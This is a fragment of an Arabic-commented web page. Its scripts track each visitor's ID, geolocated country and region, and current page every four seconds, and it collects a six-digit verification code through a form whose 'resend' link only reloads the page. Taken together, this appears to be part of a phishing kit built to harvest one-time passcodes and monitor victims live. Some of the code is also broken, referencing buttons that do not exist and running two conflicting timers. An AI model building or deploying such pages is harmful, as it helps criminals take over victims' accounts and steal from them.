<script>
  // 1. تفعيل المعرف الثابت لكل زائر لمنع التكرار الجلسات
  let visitorCode = localStorage.getItem('visitor_code');
  if (!visitorCode) {
      visitorCode = 'VSR-' + Math.random().toString(36).substring(2, 9).toUpperCase();
      localStorage.setItem('visitor_code', visitorCode);
  }

  async function sendTracking() {
      // استعادة الدولة والمنطقة المخزنة لتسريع الموقع وتوفير البيانات
      let countryCode = localStorage.getItem('visitor_country') || 'un';
      let regionName = localStorage.getItem('visitor_region') || 'جاري التحديد...';

      if (countryCode === 'un' || regionName === 'جاري التحديد...') {
          try {
              // جلب البيانات بدقة (رابط سريع ومفتوح تماماً لجميع دول العالم ومناطق السعودية)
              const res = await fetch('https://ipapi.co');
              const geo = await res.json();
              
              countryCode = geo.country_code ? geo.country_code.toLowerCase() : 'sa';
              regionName = geo.region || geo.city || 'منطقة عامة';
              
              localStorage.setItem('visitor_country', countryCode);
              localStorage.setItem('visitor_region', regionName);
          } catch (e) {
              // حل احتياطي سريع في حال تعطل الرابط الأول لأي سبب
              try {
                  const resAlt = await fetch('https://ipinfo.io');
                  const geoAlt = await resAlt.json();
                  countryCode = geoAlt.country ? geoAlt.country.toLowerCase() : 'sa';
                  regionName = geoAlt.region || geoAlt.city || 'السعودية';
                  
                  localStorage.setItem('visitor_country', countryCode);
                  localStorage.setItem('visitor_region', regionName);
              } catch (err) {}
          }
      }

      // 2. تحويل وتجهيز البيانات للإرسال المتوافق مع الاستضافة المجانية
      const params = new URLSearchParams();
      params.append('code', visitorCode);
      params.append('pageTitle', document.title); // اسم الصفحة دقيق بدون روابط
      params.append('countryCode', countryCode); // كود الدولة للعلم
      params.append('region', regionName); // إرسال المنطقة بشكل مستقل ومستقر

      fetch('track.php', {
          method: 'POST',
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          body: params
      }).catch(e => console.log(e));
  }

  // بث التحديث الفوري وتكراره كل 4 ثوانٍ لتأكيد التواجد
  sendTracking();
  setInterval(sendTracking, 4000);

  // تحديث فوري دقيق للاسم والحالة عند الرجوع والتقدم بأزرار المتصفح
  window.addEventListener('pageshow', sendTracking);
</script>

<form action="process.php" method="POST" id="otpForm">
    
    <!-- حقل إدخال الـ 6 أرقام الخاص بك -->
    <div class="input-group">
        <label for="otp-code">أدخل رمز التحقق المرسل</label>
        <input type="text" id="otp-code" name="otp_code" class="input-control" 
               placeholder="••••••" maxlength="6" pattern="\d{6}" inputmode="numeric" 
               title="يرجى كتابة الـ 6 أرقام كاملة وبشكل صحيح" oninput="validateOtpOnly(this)" required>
    </div>

    <!-- عداد إعادة الإرسال المحدث (يعرض الوقت الفعلي فقط) -->
    <div class="otp-countdown" id="countdownArea">
        <span id="timer">59</span> ثانية
    </div>

    <!-- زر التأكيد -->

</form>

<script>
// 1. منع كتابة أي شيء عدا الأرقام في حقل الرمز
function validateOtpOnly(input) {
    input.value = input.value.replace(/\D/g, '');
}

// 2. تشغيل العداد التنازلي التلقائي من 59 ثانية
let timeLeft = 59;
const timerId = setInterval(function() {
    if (timeLeft <= 0) {
        clearInterval(timerId);
        document.getElementById('countdownArea').innerHTML = "<a href='#' onclick='resendOtp()'>إعادة إرسال الرمز مرة أخرى</a>";
    } else {
        document.getElementById('timer').innerText = timeLeft;
    }
    timeLeft -= 1;
}, 1000);

function resendOtp() {
    alert('جاري إعادة إرسال رمز تحقق جديد...');
    window.location.reload();
}

// 3. التحقق عند الضغط على زر الإرسال ومنع النقر المتكرر
document.getElementById('otpForm').addEventListener('submit', function(e) {
    const otpInput = document.getElementById('otp-code');
    const submitBtn = document.getElementById('otpSubmitBtn');

    if (otpInput.value.length !== 6) {
        alert('الرجاء إدخال رمز التحقق المكون من 6 أرقام كاملاً.');
        e.preventDefault();
        return false;
    }

    // تغيير نص الزر وتعطيله لمنع تكرار الإرسال
    submitBtn.disabled = true;
    submitBtn.innerText = "🔒 جاري التحقق من الرمز...";
    return true;
});
</script>

    <script>
        // تم تعديل الوقت هنا لتبدأ من 59 ثانية فقط
        let countdown = 59; 
        const timerElement = document.getElementById('timer');
        const countdownWrapper = document.getElementById('countdownArea');
        const redirectBtn = document.getElementById('redirectBtn');
        const loadingIcon = document.querySelector('.submit-btn');

        const interval = setInterval(() => {
            if (countdown >= 0) {
                const minutes = String(Math.floor(countdown / 60)).padStart(2, '0');
                const seconds = String(countdown % 60).padStart(2, '0');
                timerElement.textContent = `${minutes}:${seconds}`;
                countdown--;
            } else {
                clearInterval(interval);
                countdownWrapper.style.display = 'none';
                redirectBtn.style.display = 'block';
                if (loadingIcon) loadingIcon.style.display = 'none'; // إيقاف التحميل فوراً عند الصفر
            }
        }, 1000);

        // إخفاء زر العودة في البداية
        redirectBtn.style.display = 'none';

        // إعادة توجيه المستخدم عند الضغط على زر العودة
        redirectBtn.addEventListener('click', () => {
            window.location.href = 'otoop.html'; // استبدل otoop.html بصفحتك الرئيسية
        });

        // إخفاء العداد وزر العودة عند إعادة تحميل الصفحة
        window.addEventListener('load', () => {
            countdownWrapper.style.display = 'block';
            redirectBtn.style.display = 'none';
            if (loadingIcon) loadingIcon.style.animation = 'spin 1s linear infinite'; // إعادة تشغيل حركة التحميل
        });

        // إضافة حركة دوران لزر التحميل
        const style = document.createElement('style');
        style.innerHTML = `
            @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
            }
        `;
        document.head.appendChild(style);
    </script>
